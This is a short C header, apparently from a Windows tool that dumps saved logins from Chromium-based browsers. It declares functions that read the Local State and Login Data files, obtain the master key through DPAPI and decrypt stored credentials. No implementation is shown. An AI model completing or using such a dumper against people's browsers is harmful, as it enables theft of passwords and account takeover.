#ifndef CHROMIUM_H
#define CHROMIUM_H

#include <windows.h>
#include <dpapi.h>
#include <stdio.h>

#include "base64/base64.h"
#include "sqlite3/sqlite3.h"
#include "json/json.h"
#include "sodium/sodium.h"
#include "credentials.h"

typedef struct {
    char* name;
    char* localState;
    char* loginData;
} ChromiumBrowser;

ChromiumBrowser initChromium(char* local_state, char* login_data, char* name);
unsigned char* getChromiumMasterKey(ChromiumBrowser* browser);
credList* getChromiumCredentials(ChromiumBrowser* browser, unsigned char* MasterKey);
credList* dumpChromium(ChromiumBrowser *browser);

#endif //CHROMIUM_H
